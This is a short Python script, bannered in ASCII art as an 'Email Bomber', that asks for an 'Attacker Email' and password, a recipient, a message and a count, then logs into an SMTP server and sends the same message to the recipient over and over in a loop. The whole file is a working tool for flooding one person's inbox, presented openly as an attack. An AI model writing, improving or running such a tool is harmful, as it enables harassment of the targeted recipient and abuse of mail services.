from getpass import getpass
from time import sleep
import sys
import os
import smtplib
from email.mime.text import MIMEText

os.system('cls')


def mail():
    print('                                                                    ')
    print('                                                                    ')
    print('              ______                   _                            ')
    print('             |  ____|               (_) |                           ')
    print('             | |__   _ __ ___   __ _ _| |                           ')
    print("             |  __| | '_ ` _ \ / _` | | |                           ")
    print('             | |____| | | | | | (_| | | |                           ')
    print('             |______|_| |_| |_|\__,_|_|_|                           ')
    print('              ____                  _                               ')
    print('             |  _ \                | |                              ')
    print('             | |_) | ___  _ __ ___ | |__   ___ _ __                 ')
    print("             |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|                ")
    print('             | |_) | (_) | | | | | | |_) |  __/ |                   ')
    print('             |____/ \___/|_| |_| |_|_.__/ \___|_|                   ')
    print('                                                                    ')
    print('                                                                    ')
    print('\n\n')

    user = input('Name: ')
    email = input('\nAttacker Email: ')
    password = getpass('\nAttacker Password: ')
    to = input('\nRecipient Email: ')
    mssg = MIMEText(input('\nMessage: '))
    number = input('\nNumber of Emails: ')
    smtp = input('\nSMTP Server (smtp.(your_input).com): ')
    port = input('\nPort: ')
    stmp = 'smtp.' + smtp + '.com'

    try:
        server = smtplib.SMTP(stmp, port)
        server.ehlo()
        server.starttls()
        server.login(email, password)
        for i in range(1, int(number) + 1):
            msg = f'From: {user}\nMessage: {mssg}'
            server.sendmail(email, to, msg)
            print("\rE-mails sent: %i" % i)
            sleep(1)
            sys.stdout.flush()
        server.quit()
        print('\nEmails have been sent!')
        sys.exit()

    except KeyboardInterrupt:
        print('\n[-] Canceled')
        sys.exit()

    except smtplib.SMTPAuthenticationError:
        print('\n[!] The username or password you entered was not accepted')
        sys.exit()

    except smtplib.SMTPConnectError:
        print("\n[!] Couldn't connect to the SMTP server")
        sys.exit()
